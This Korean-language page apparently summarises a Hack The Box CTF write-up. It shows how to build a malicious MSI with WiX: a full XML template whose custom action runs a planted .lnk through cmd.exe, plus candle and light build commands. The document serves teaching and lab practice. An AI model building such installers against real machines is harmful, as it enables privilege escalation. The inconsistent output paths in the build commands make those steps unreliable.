# 악성 MSI 생성 및 Root 획득

{{#include ../../banners/hacktricks-training.md}}

MSI installer 생성에는 wixtools가 사용되며, 구체적으로는 [wixtools](http://wixtoolset.org)가 활용됩니다. 다른 MSI builder도 시도했지만, 이 특정 사례에서는 성공하지 못했다는 점을 언급할 필요가 있습니다.<sup>[[1]](#references)</sup>

wix MSI 사용 예제를 종합적으로 이해하려면 [이 페이지](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)를 참조하는 것이 좋습니다. 여기에서 wix MSI 사용 방법을 보여 주는 다양한 예제를 확인할 수 있습니다.<sup>[[2]](#references)</sup>

목표는 lnk file을 실행하는 MSI를 생성하는 것입니다. 이를 위해 다음 XML 코드를 사용할 수 있습니다([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Package element에는 각각 installer 버전을 지정하고 package가 압축되었는지 여부를 나타내는 InstallerVersion 및 Compressed와 같은 attributes가 포함되어 있다는 점에 유의해야 합니다.

생성 과정에서는 wixtools의 tool인 candle.exe를 사용하여 msi.xml에서 wixobject를 생성합니다. 다음 command를 실행해야 합니다:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
또한 게시물에 명령과 해당 출력이 표시된 이미지가 제공되어 있다는 점을 언급할 가치가 있습니다. 시각적 참고 자료로 활용할 수 있습니다.<sup>[[1]](#references)</sup>

더 나아가 wixtools의 또 다른 도구인 light.exe를 사용하여 wixobject에서 MSI 파일을 생성합니다. 실행할 명령은 다음과 같습니다.<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
이전 command와 마찬가지로, 해당 command와 출력 결과를 보여 주는 image가 게시물에 포함되어 있습니다.<sup>[[1]](#references)</sup>

이 summary는 유용한 정보를 제공하는 것을 목표로 하지만, 더 포괄적인 세부 정보와 정확한 지침은 원본 게시물을 참조하는 것이 좋습니다.<sup>[[1]](#references)</sup>

## References

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
